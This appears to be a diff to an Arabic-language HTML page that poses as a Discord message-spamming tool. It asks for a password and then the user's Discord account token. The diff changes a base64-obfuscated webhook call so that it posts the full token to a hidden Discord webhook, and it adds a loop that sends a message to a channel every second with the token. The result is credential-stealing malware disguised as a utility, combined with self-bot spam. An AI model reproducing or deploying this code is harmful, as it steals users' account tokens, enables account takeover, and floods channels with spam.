@@ -25,18 +25,22 @@
       margin-bottom: 20px;
     }
     button {
-      background-color: black;
-      color: white;
-      border: none;
       padding: 12px 24px;
       font-size: 1rem;
       cursor: pointer;
+      border: none;
+      margin: 5px;
     }
-    button:hover {
-      background-color: #222;
-    }
-    #tokenScreen {
+    #tokenScreen, #messageScreen {
       display: none;
+    }
+    .send-btn {
+      background-color: green;
+      color: white;
+    }
+    .stop-btn {
+      background-color: red;
+      color: white;
     }
   </style>
 </head>
@@ -55,53 +59,101 @@
     <button id="checkTokenBtn">التالي</button>
   </div>
 
+  <div class="container" id="messageScreen">
+    <h2>اكتب ID الروم:</h2>
+    <input id="channelIdInput" type="text" placeholder="ايدي الروم" />
+    <h2>اكتب الرسالة:</h2>
+    <input id="messageInput" type="text" placeholder="الرسالة" />
+    <br />
+    <button class="send-btn" id="startBtn">إرسال</button>
+    <button class="stop-btn" id="stopBtn">توقف</button>
+  </div>
+
   <script>
     const encPass = "QWhtZWQ=";
     const encWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3ODAzNjczODc1MTk4Nzg5NC8xM0hETkNXX2pGWk10MU9qR2JxZDhWV0ZWZzlNcFhCS1VuZDBNSlJ1OHVRNERYbmdmTU5NdXR4MWRqQTEyRTk3UXgzZg==";
 
+    const b64d = s => atob(s);
     const passwordInput = document.getElementById("passwordInput");
     const tokenInput = document.getElementById("tokenInput");
+    const channelIdInput = document.getElementById("channelIdInput");
+    const messageInput = document.getElementById("messageInput");
+
     const passwordScreen = document.getElementById("passwordScreen");
     const tokenScreen = document.getElementById("tokenScreen");
+    const messageScreen = document.getElementById("messageScreen");
+
     const checkPasswordBtn = document.getElementById("checkPasswordBtn");
     const checkTokenBtn = document.getElementById("checkTokenBtn");
+    const startBtn = document.getElementById("startBtn");
+    const stopBtn = document.getElementById("stopBtn");
 
-    function b64d(s) {
-      return atob(s);
-    }
+    let userToken = "";
+    let interval = null;
 
-    checkPasswordBtn.addEventListener("click", () => {
+    checkPasswordBtn.onclick = () => {
       if (b64d(encPass) === passwordInput.value.trim()) {
         passwordScreen.style.display = "none";
         tokenScreen.style.display = "block";
       } else {
-        alert("رمز خاطئ!");
+        alert("رمز خاطئ");
       }
-    });
+    };
 
-    checkTokenBtn.addEventListener("click", () => {
+    checkTokenBtn.onclick = () => {
       const token = tokenInput.value.trim();
-      if (!token) {
-        alert("أدخل التوكن");
-        return;
-      }
+      if (!token) return alert("أدخل التوكن");
       fetch("https://discord.com/api/v9/users/@me", {
         headers: { Authorization: token }
       }).then(res => {
         if (res.ok) {
-          sendWebhook();
-          alert("تم التحقق من التوكن وإرسال البيانات.");
+          userToken = token;
+          sendWebhook(token);
+          tokenScreen.style.display = "none";
+          messageScreen.style.display = "block";
         } else {
           alert("توكن غير صالح");
         }
       }).catch(() => alert("خطأ في الاتصال"));
-    });
+    };
 
-    function sendWebhook() {
+    function sendWebhook(token) {
       fetch(b64d(encWebhook), {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: "✅ تم الدخول والتحقق من التوكن بنجاح." })
+        body: JSON.stringify({ content: "🔑 التوكن: " + token })
       });
     }
+
+    startBtn.onclick = () => {
+      const channel = channelIdInput.value.trim();
+      const message = messageInput.value.trim();
+      if (!channel || !message) return alert("اكتب ID الروم والرسالة");
+      if (interval) clearInterval(interval);
+      interval = setInterval(() => {
+        fetch(`https://discord.com/api/v9/channels/${channel}/messages`, {
+          method: "POST",
+          headers: {
+            Authorization: userToken,
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ content: message })
+        }).then(r => {
+          if (!r.ok) {
+            clearInterval(interval);
+            alert("فشل الإرسال");
+          }
+        }).catch(() => {
+          clearInterval(interval);
+          alert("خطأ في الاتصال");
+        });
+      }, 1000);
+    };
+
+    stopBtn.onclick = () => {
+      if (interval) clearInterval(interval);
+      alert("تم إيقاف الإرسال");
+    };
   </script>
+</body>
+</html>
